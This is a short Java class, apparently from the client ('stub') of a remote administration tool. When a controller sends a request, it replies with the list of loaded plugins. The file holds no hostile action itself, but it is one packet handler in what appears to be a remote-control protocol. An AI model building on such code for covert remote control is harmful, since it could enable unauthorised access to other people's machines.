package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.stub.packets.outgoing.Packet67LoadedPlugins;

public class Packet89LoadedPlugins extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.addToSendQueue(new Packet67LoadedPlugins());
	}

}
